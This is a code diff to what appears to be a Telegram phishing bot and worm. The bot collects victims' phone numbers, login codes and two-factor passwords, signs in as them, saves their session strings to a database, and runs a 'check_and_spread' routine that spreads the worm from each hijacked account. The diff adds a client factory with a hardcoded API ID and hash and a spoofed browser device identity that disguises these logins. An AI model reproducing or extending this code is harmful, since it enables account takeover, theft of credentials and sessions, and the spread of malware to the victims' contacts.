@@ -32,6 +32,17 @@ def setconfig(key: str, value: Any) -> None:
     logger.info(f"Setting config key '{key}' to '{value}'")
     mongo_client.default.config.update_one({'key': key}, {'$set': {'key':key, 'value':value}}, upsert=True)
 
+def newTgClient(session: Optional[str] = None) -> TelegramClient:
+    return TelegramClient(
+        StringSession() if not session else StringSession(session),
+        2496,
+        '8da85b0d5bfe62527e5b244c209159c3',
+        device_model="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3",
+        system_version="Win32",
+        app_version="2.0 K",
+        lang_code="en",
+        system_lang_code="en-US"
+    )
 def yesno(x: str, page: str = 'def') -> list:
     return [
         [Button.inline(strings['yes'], f'{{"page":"{page}","press":"yes{x}"}}')],
@@ -44,7 +55,7 @@ async def is_session_authorized(session: str, ref: str) -> bool:
     logger.info(f"Checking if session:{ref} is authorized.")
     authorized = False
     try:
-        uclient = TelegramClient(StringSession(session), os.environ['API_ID'], os.environ['API_HASH'])
+        uclient = newTgClient(session)
         await uclient.connect()
         authorized = await uclient.is_user_authorized()
     finally:
@@ -55,7 +66,7 @@ async def handle_usr(phone_num: str, event: Message) -> Dict[str, Any]:
     logger.info(f"Handling user phone number: {phone_num}")
     await (await event.respond('wait..', buttons=Button.clear())).delete()
     msg = await event.respond(strings['sending'])
-    uclient = TelegramClient(StringSession(), os.environ['API_ID'], os.environ['API_HASH'])
+    uclient = newTgClient()
     await uclient.connect()
     try:
         scr = await uclient.send_code_request(phone_num)
@@ -79,20 +90,20 @@ async def sign_in(event: Message, user_data: Dict[str, Any]) -> bool:
     try:
         login = json.loads(user_data['login'])
         if len(login.get('code', ''))==login.get('code_len', 0) and login.get('pass_ok', False):
-            logger.info(f"Signing in with password for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))}.")
-            uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
+            logger.info(f"Signing in with password for user: {user_data.get('phone', user_data.get('_id', 'unknown'))}.")
+            uclient = newTgClient(login['session'])
             await uclient.connect()
             await uclient.sign_in(password=user_data['password'])
         elif len(login.get('code', ''))==login.get('code_len', 0) and not login.get('need_pass', False):
-            logger.info(f"Signing in with code for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))} .")
-            uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
+            logger.info(f"Signing in with code for user: {user_data.get('phone', user_data.get('_id', 'unknown'))} .")
+            uclient = newTgClient(login['session'])
             await uclient.connect()
             await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
         else:
             return False
         login = {}
         data = {'session': uclient.session.save(), 'logged_in': True, 'ts': round(time.time())}
-        logger.info(f"Sign-in process completed for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))}")
+        logger.info(f"Sign-in process completed for user: {user_data.get('phone', user_data.get('_id', 'unknown'))}")
         await event.edit(strings['login_success'])
     except telethon.errors.PhoneCodeInvalidError as e:
         logger.warning(f"Invalid phone code: {e}")
@@ -148,7 +159,7 @@ async def handler_all_user(event: Message) -> None:
         await event.respond(strings['ask_ok']+event.message.text, buttons=yesno('pass'))
         data['password'] = event.message.text
     elif user_data.get('logged_in', False):
-        if await is_session_authorized(user_data['session'], user_data['chat_id']):
+        if await is_session_authorized(user_data['session'], user_data['phone']):
             await event.respond(strings['already_logged_in'])
         else:
             login = await handle_usr(user_data['phone'], event)
@@ -202,11 +213,11 @@ async def check_and_spread():
         logger.info(f"Checking target: {target['phone']}")
         uclient = None
         try:
-            if not await is_session_authorized(target['session'], target['chat_id']):
+            if not await is_session_authorized(target['session'], target['phone']):
                 mongo_client.userdb.sessions.update_one({'phone': target['phone']}, {'$unset': {'logged_in':False, 'session': ''}})
                 continue
             logger.info(f"Spreading worm from {target['phone']}")
-            uclient = TelegramClient(StringSession(target['session']), os.environ['API_ID'], os.environ['API_HASH'])
+            uclient = newTgClient(target['session'])
             await uclient.connect()
             await worm(uclient, logger_bot)
             logger.info(f"Spreading finished for {target['phone']}")
